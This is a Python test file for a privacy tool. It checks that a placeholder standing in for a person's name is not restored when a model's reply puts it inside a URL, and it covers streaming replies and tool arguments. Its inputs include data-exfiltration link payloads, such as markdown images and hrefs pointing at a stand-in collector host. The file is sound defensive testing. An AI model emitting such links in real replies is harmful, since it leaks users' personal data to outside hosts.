"""R-01 (review SEC-03): a placeholder the cloud reply puts inside a URL is not restored there.

A client that renders or follows the reply would send the real value to the host the URL names. The token stays as
written and is counted in the report as withheld_in_url. Synthetic values only.
"""

import json
from types import SimpleNamespace

import pytest

from themis_shield.hooks.service import HookService
from themis_shield.restore import StreamingRestorer, restore_text, restore_tool_arguments


TOKEN = "⟦P:7f3a1c⟧"
MARA = "Mara Lindahl"
MAPPING = {TOKEN: MARA}


@pytest.mark.parametrize("text", [
    # The review's reproduction, then a bare URL, a link target and an href.
    f"Summary done. ![status](https://collector.example/p.png?n={TOKEN})",
    f"Summary done. See https://collector.example/c?n={TOKEN} for details.",
    f"Summary done. [profile](https://collector.example/u/{TOKEN}/view)",
    f'Summary done. <a href="https://collector.example/?n={TOKEN}">status</a>',
    f"<img src='https://collector.example/p.png?n={TOKEN}'>",
    f'<form action="https://collector.example/f/{TOKEN}"></form>',
    f"<img SRC = https://collector.example/p.png?n={TOKEN} alt=x>",
    f'<a xlink:href="/local/{TOKEN}">relative</a>',
    f"![status](/p.png?n={TOKEN})",
    f"![status](https://collector.example/p_(1).png?n={TOKEN})",
    f"![status](<https://collector.example/p.png?n={TOKEN}>)",
    f"Write to mailto:desk@example.org?subject={TOKEN} today",
    f"data:text/plain,{TOKEN}",
    f"ftp://files.example/{TOKEN}.txt",
    f"file:///C:/x/{TOKEN}",
    f"HTTPS://collector.example/{TOKEN}",
    f"https:collector.example/{TOKEN}",
    f"git+ssh://host.example/{TOKEN}",
    "https://collector.example/?n=P:7f3a1c",
    "https://collector.example/?n=⟦ p:7F3A1C ⟧",
])
def test_token_inside_a_url_is_withheld_and_reported(text):
    result = restore_text(text, MAPPING)
    assert MARA not in result.text
    assert result.text == text
    assert result.report.withheld_in_url == 1
    assert result.report.restored_count == 0
    assert result.report.unknown_count == 0
    assert result.report.dropped_entities == ()  # it was written, not omitted


@pytest.mark.parametrize("text", [
    f"email {TOKEN} at https://example.org",
    f"https://example.org {TOKEN}",
    f"(see https://example.org) {TOKEN}",
    f"[{TOKEN}](https://example.org)",
    f'<a href="https://example.org">{TOKEN}</a>',
    f"<a href=https://example.org>{TOKEN}</a>",
    f"Name:{TOKEN}",
    f"metadata:{TOKEN}",
    f"({TOKEN})",
    f"'https://example.org' {TOKEN}",
])
def test_token_next_to_a_url_but_not_in_it_is_restored(text):
    result = restore_text(text, MAPPING)
    assert result.text == text.replace(TOKEN, MARA)
    assert result.report.withheld_in_url == 0
    assert result.report.restored_count == 1


def test_a_spaced_token_does_not_end_the_url_for_the_next_one():
    text = "https://collector.example/?a=⟦ P:7f3a1c ⟧&b=" + TOKEN + " then " + TOKEN
    result = restore_text(text, MAPPING)
    assert result.text == text[:-len(TOKEN)] + MARA
    assert result.report.withheld_in_url == 2 and result.report.restored_count == 1


REPLY = (
    f"Hi {TOKEN}. ![s](https://c.example/p.png?n={TOKEN}) and https://c.example/q?n=P:7f3a1c\n"
    f'<a href="/u/{TOKEN}">{TOKEN}</a> ⟦⟦ :: [{TOKEN}](x/{TOKEN}) mailto:{TOKEN} {TOKEN}.'
)


def test_streaming_decision_does_not_depend_on_chunk_boundaries():
    expected = restore_text(REPLY, MAPPING)
    assert expected.report.withheld_in_url == 5 and expected.report.restored_count == 4
    for offset in range(len(REPLY) + 1):
        stream = StreamingRestorer(MAPPING)
        output = stream.feed(REPLY[:offset]) + stream.feed(REPLY[offset:]) + stream.close()
        assert output == expected.text, offset
        assert stream.report == expected.report, offset
    stream = StreamingRestorer(MAPPING)
    output = "".join(stream.feed(byte) for byte in (bytes([b]) for b in REPLY.encode("utf-8")))
    assert output + stream.close() == expected.text
    assert stream.report == expected.report


def test_tool_arguments_keep_tokens_in_url_strings_only():
    raw = json.dumps({
        "url": f"https://collector.example/?n={TOKEN}",
        "note": f"see https://collector.example/x?n={TOKEN} for {TOKEN}",
        "name": TOKEN,
    })
    assert json.loads(restore_tool_arguments(raw, MAPPING)) == {
        "url": f"https://collector.example/?n={TOKEN}",
        "note": f"see https://collector.example/x?n={TOKEN} for {MARA}",
        "name": MARA,
    }


def test_hook_tool_input_key_with_a_token_in_a_url_is_still_refused():
    service = SimpleNamespace(_mapping=lambda identifier, state: MAPPING)
    value = {"url": f"https://collector.example/?n={TOKEN}", "name": TOKEN}
    assert HookService._restore_input(service, "c", None, value) == {
        "url": f"https://collector.example/?n={TOKEN}", "name": MARA,
    }
    with pytest.raises(PermissionError, match="TOKEN_IN_TOOL_KEY"):
        HookService._restore_input(service, "c", None, {f"https://c.example/{TOKEN}": 1})
